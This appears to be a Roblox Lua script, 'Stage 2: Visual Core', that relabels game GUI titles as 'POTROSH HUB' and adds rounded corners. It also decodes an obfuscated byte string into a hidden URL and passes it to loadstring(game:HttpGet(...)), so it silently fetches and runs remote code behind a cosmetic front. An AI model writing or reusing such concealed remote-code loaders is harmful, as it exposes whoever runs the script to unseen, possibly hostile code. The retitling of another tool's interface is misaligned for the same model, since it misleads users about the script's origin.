
--[[ STAGE 2: VISUAL CORE ]]
local IsmofU3aINZzF9gxvozh="\246\239\251\190\185\019\023\029\208\035\043\048\252\059\058\046\058\069\030\031\086\076\100\074\056\098\112\116\080\081\144\138\142\150\153\127\116\179\178\189\182\146\146\208\203\215\201\195\176\186\202\175\243\247\004\005\200\014\019\029\020\029\042\041\035\056\250\072\056\072\084\085\098\095\104\102\108\112\054\125\128\137\073\136\147\163\151\162\168\177\165\193\176\187\201\197\205\206\216\231\163\225\244\230\184\189\173\251\001\010\015\024"local KTLqn4gm87mo83wqj=154 local ER82nRO45WEvBJN=231 local PiEJTbqXlUL2qjVt2Nr=0 local MSKcF8Wyuy2zULVtP8=5 local jaElsHfqFM020TVSMN1=15 local gSt9S5qp_AsEMz6uqxh=true local yAteZnl9DYJfIN3=bit32 and bit32.bxor if not yAteZnl9DYJfIN3 then yAteZnl9DYJfIN3=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local UAYvlo5c7AG16q={}for jbEnx5S3eVDa=1,#IsmofU3aINZzF9gxvozh do local aj2lkYkTjqGkI02=string.byte(IsmofU3aINZzF9gxvozh,jbEnx5S3eVDa)local cJhrT_2MkUinbVOm_Y=(ER82nRO45WEvBJN+(jbEnx5S3eVDa*MSKcF8Wyuy2zULVtP8)+jaElsHfqFM020TVSMN1)%256 if PiEJTbqXlUL2qjVt2Nr==0 then aj2lkYkTjqGkI02=(aj2lkYkTjqGkI02-cJhrT_2MkUinbVOm_Y)%256 UAYvlo5c7AG16q[jbEnx5S3eVDa]=string.char(yAteZnl9DYJfIN3(aj2lkYkTjqGkI02,KTLqn4gm87mo83wqj))else aj2lkYkTjqGkI02=yAteZnl9DYJfIN3(aj2lkYkTjqGkI02,KTLqn4gm87mo83wqj)UAYvlo5c7AG16q[jbEnx5S3eVDa]=string.char((aj2lkYkTjqGkI02-cJhrT_2MkUinbVOm_Y)%256)end end local M1JIUKyDIOPWLYtnS=table.concat(UAYvlo5c7AG16q)if gSt9S5qp_AsEMz6uqxh then M1JIUKyDIOPWLYtnS=string.reverse(M1JIUKyDIOPWLYtnS)end local e_VbpHUN63me1P=M1JIUKyDIOPWLYtnS
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(e_VbpHUN63me1P))()
